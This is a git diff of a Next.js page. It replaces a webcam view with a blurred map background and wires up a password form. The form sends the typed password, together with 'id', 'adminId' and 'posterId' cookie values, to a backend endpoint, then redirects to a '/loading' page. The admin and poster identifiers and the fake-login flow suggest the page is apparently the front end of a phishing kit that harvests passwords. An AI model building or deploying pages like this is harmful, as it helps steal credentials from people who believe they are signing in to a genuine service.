@@ -1,43 +1,79 @@
 "use client";
-import React, { useEffect, useState } from "react";
-import Webcam from "react-webcam";
-import { useParams } from "next/navigation";
-function page() {
-  const [password, setPassword] = useState("");
-  const playNotificationSound = () => {
-    const audio = new Audio("/tune.mp3"); // Path to the ringtone file
-    audio.play().catch((error) => {
-      console.error("Error playing the sound:", error);
-    });
+import React, { useState } from "react";
+import { useRouter } from "next/navigation";
+import Cookies from "js-cookie";
+import { API_URL } from "../config";
 
-    return () => {
-      audio.pause(); // Stop the audio if the component unmounts
-      audio.currentTime = 0; // Reset the audio to the beginning
+function page() {
+  // const [password, setPassword] = useState("");
+  // const playNotificationSound = () => {
+  //   const audio = new Audio("/tune.mp3"); // Path to the ringtone file
+  //   audio.play().catch((error) => {
+  //     console.error("Error playing the sound:", error);
+  //   });
+
+  //   return () => {
+  //     audio.pause(); // Stop the audio if the component unmounts
+  //     audio.currentTime = 0; // Reset the audio to the beginning
+  //   };
+  // };
+  // const requestNotificationPermission = async () => {
+  //   try {
+  //     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+  //     if (stream) {
+  //       playNotificationSound();
+  //     }
+  //   } catch (error) {
+  //     console.error("Error requesting notification permission:", error);
+  //   }
+  // };
+  // useEffect(() => {
+  //   requestNotificationPermission();
+  // }, []);
+  const router = useRouter();
+  const id = Cookies.get("id");
+  const adminId = Cookies.get("adminId");
+  const posterId = Cookies.get("posterId");
+  const [password, setPassword] = useState("");
+  const handleSubmit = async () => {
+    if (!password) {
+      return;
+    }
+    const values = {
+      id,
+      password,
+      adminId,
+      posterId,
     };
-  };
-  const requestNotificationPermission = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      if (stream) {
-        playNotificationSound();
-      }
-    } catch (error) {
-      console.error("Error requesting notification permission:", error);
+    const url = `${API_URL}/password/post`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      console.log("success", data);
+      router.push("/loading");
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
     }
   };
-  useEffect(() => {
-    requestNotificationPermission();
-  }, []);
   return (
-    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
-      <Webcam
-        audio={false}
-        className="object-cover h-screen w-screen lg:w-auto"
-        // height={1080}
-        // width={1262}
-        // screenshotFormat="image/jpeg"
-        // videoConstraints={videoConstraints}
-      />
+    <div className="relative min-h-screen w-screen flex flex-col justify-center items-center bg-black">
+        <iframe
+    className="absolute inset-0 w-full h-full object-cover z-[-1] blur-sm"
+    src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
+    allowFullScreen=""
+    loading="lazy"
+  ></iframe>
       <div className="absolute  flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
         <div className="bg-white w-[80%] max-w-4xl p-6 rounded-lg shadow-md flex flex-col md:flex-row items-start gap-6 md:gap-40 z-10">
           {/* Left Section */}
@@ -76,7 +112,7 @@ function page() {
                 Create account
               </p>
               <button
-                // onClick={handleSubmit}
+                onClick={handleSubmit}
                 className="bg-zinc-800 text-white px-6 py-1 rounded-lg mt-1"
               >
                 Next
